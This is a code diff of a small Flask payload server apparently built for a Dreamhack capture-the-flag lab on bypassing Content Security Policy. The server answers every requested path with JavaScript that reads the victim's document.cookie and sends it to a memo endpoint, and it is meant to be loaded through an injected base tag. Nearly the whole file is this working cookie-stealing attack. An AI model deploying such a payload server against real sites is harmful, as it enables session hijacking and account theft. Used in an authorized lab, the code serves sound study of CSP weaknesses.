@@ -1,22 +1,30 @@
-"""Minimal public-hosting payload server for the Dreamhack CSP Bypass Advanced lab.
 
-Every path returns JavaScript because the vulnerable page's injected <base> tag
-redirects its /static/js/*.js requests to this server. Use only for your own
-authorized CTF instance.
-"""
 import os
-from flask import Flask, Response
+from flask import Flask, Response, request
 
 app = Flask(__name__)
-PAYLOAD = (
-    "location.href = 'http://127.0.0.1:8000/memo?memo=' "
-    "+ encodeURIComponent(document.cookie);"
-)
 
-@app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
+# Dreamhack CSP Bypass Advanced 실습용 페이로드
+PAYLOAD = """
+location.href =
+    'http://127.0.0.1:8000/memo?memo=' +
+    encodeURIComponent(document.cookie);
+"""
+
+@app.route("/", defaults={"path": ""}, methods=["GET", "HEAD"])
+@app.route("/<path:path>", methods=["GET", "HEAD"])
 def serve_payload(path):
-    return Response(PAYLOAD, content_type='application/javascript; charset=utf-8')
+    app.logger.info("JavaScript requested: %s", request.path)
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', '8080')))
+    return Response(
+        PAYLOAD,
+        status=200,
+        content_type="application/javascript; charset=utf-8",
+        headers={"Cache-Control": "no-store"}
+    )
+
+if __name__ == "__main__":
+    app.run(
+        host="0.0.0.0",
+        port=int(os.environ.get("PORT", "8080"))
+    )
